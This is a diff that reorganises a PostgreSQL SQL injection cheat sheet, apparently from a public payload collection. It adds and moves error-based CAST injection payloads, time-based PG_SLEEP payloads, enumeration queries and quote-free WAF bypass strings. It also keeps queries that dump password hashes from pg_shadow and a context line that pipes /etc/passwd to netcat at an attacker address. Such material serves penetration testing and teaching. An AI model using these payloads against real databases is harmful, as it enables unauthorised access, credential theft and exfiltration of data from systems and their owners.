@@ -6,12 +6,8 @@
 ## Summary
 
 * [PostgreSQL Comments](#postgresql-comments)
-* [PostgreSQL Version](#postgresql-version)
-* [PostgreSQL Current User](#postgresql-current-user)
-* [PostgreSQL Privileges](#postgresql-privileges)
-    * [PostgreSQL List Privileges](#postgresql-list-privileges)
-    * [PostgreSQL Superuser Role](#postgresql-superuser-role)
 * [PostgreSQL Enumeration](#postgresql-enumeration)
+* [PostgreSQL Methodology](#postgresql-methodology)
 * [PostgreSQL Error Based](#postgresql-error-based)
     * [PostgreSQL XML Helpers](#postgresql-xml-helpers)
 * [PostgreSQL Blind](#postgresql-blind)
@@ -27,72 +23,65 @@
     * [Using libc.so.6](#using-libcso6)
 * [PostgreSQL WAF Bypass](#postgresql-waf-bypass)
     * [Alternative to Quotes](#alternative-to-quotes)
+* [PostgreSQL Privileges](#postgresql-privileges)
+    * [PostgreSQL List Privileges](#postgresql-list-privileges)
+    * [PostgreSQL Superuser Role](#postgresql-superuser-role)
 * [References](#references)
 
 
 ## PostgreSQL Comments
 
-| Type | Comment |
-| ---- | ------- |
-| Single-Line Comment | `--` |
-| Multi-Line Comment  | `/**/` |
+| Type                | Comment |
+| ------------------- | ------- |
+| Single-Line Comment | `--`    |
+| Multi-Line Comment  | `/**/`  |
 
-
-## PostgreSQL Version
-
-```sql
-SELECT version()
-```
-
-## PostgreSQL Current User	
-
-```sql
-SELECT user;
-SELECT current_user;
-SELECT session_user;
-SELECT usename FROM pg_user;
-SELECT getpgusername();
-```
-
-
-## PostgreSQL Privileges
-
-### PostgreSQL List Privileges
-
-Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.
-
-```sql
-SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
-```
-
-### PostgreSQL Superuser Role
-
-```sql
-SHOW is_superuser; 
-SELECT current_setting('is_superuser');
-SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
-```
 
 ## PostgreSQL Enumeration
 
-| SQL Query                               | Description    |
-| --------------------------------------- | -------------- |
-| `SELECT current_database()`             | Database Name  |
-| `SELECT datname FROM pg_database`       | List Databases |
-| `SELECT table_name FROM information_schema.tables` | List Tables |
-| `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` | List Columns |
-| `SELECT usename FROM pg_user`           | List PostgreSQL Users |
-| `SELECT usename, passwd FROM pg_shadow` | List Password Hashes  |
-| `SELECT usename FROM pg_user WHERE usesuper IS TRUE` | List Database Administrator Accounts |
+| Description            | SQL Query                               |
+| ---------------------- | --------------------------------------- |
+| DBMS version           | `SELECT version()`                      | 
+| Database Name          | `SELECT CURRENT_DATABASE()`             |
+| Database Schema        | `SELECT CURRENT_SCHEMA()`               |
+| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |
+| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |
+| List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
+| Current User           | `SELECT user;`                          |
+| Current User           | `SELECT current_user;`                  |
+| Current User           | `SELECT session_user;`                  |
+| Current User           | `SELECT usename FROM pg_user;`          |
+| Current User           | `SELECT getpgusername();`               |
+
+
+## PostgreSQL Methodology
+
+| Description            | SQL Query                                    |
+| ---------------------- | -------------------------------------------- |
+| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |
+| List Databases         | `SELECT datname FROM pg_database`            | 
+| List Tables            | `SELECT table_name FROM information_schema.tables` |
+| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
+| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
+| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |
 
 
 ## PostgreSQL Error Based
 
+| Name         | Payload         |
+| ------------ | --------------- |
+| CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
+| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
+| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
+| CAST | `AND (SELECT version())::int=1 -- -` |
+
+
+
 ```sql
-,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
-,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
-,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
-,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
+CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
+CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
+CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
+CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
 ```
 
 ```sql
@@ -105,14 +94,14 @@ SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
 ### PostgreSQL XML Helpers
 
 ```sql
-select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
+SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
 ```
 
 The `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.
 
 ```sql
-select database_to_xml(true,true,''); -- dump the current database to XML
-select database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
+SELECT database_to_xml(true,true,''); -- dump the current database to XML
+SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
 ```
 
 Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.
@@ -166,6 +155,7 @@ select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end
 ```
 
 ```sql
+AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
 AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
 ```
@@ -276,15 +266,33 @@ SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 ```
 
 
-### PostgreSQL WAF Bypass
+## PostgreSQL WAF Bypass
 
-#### Alternative to Quotes
+### Alternative to Quotes
 
 | Payload            | Technique |
 | ------------------ | --------- |
 | `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
 | `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |
 
+
+## PostgreSQL Privileges
+
+### PostgreSQL List Privileges
+
+Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.
+
+```sql
+SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
+```
+
+### PostgreSQL Superuser Role
+
+```sql
+SHOW is_superuser; 
+SELECT current_setting('is_superuser');
+SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
+```
 
 ## References
 
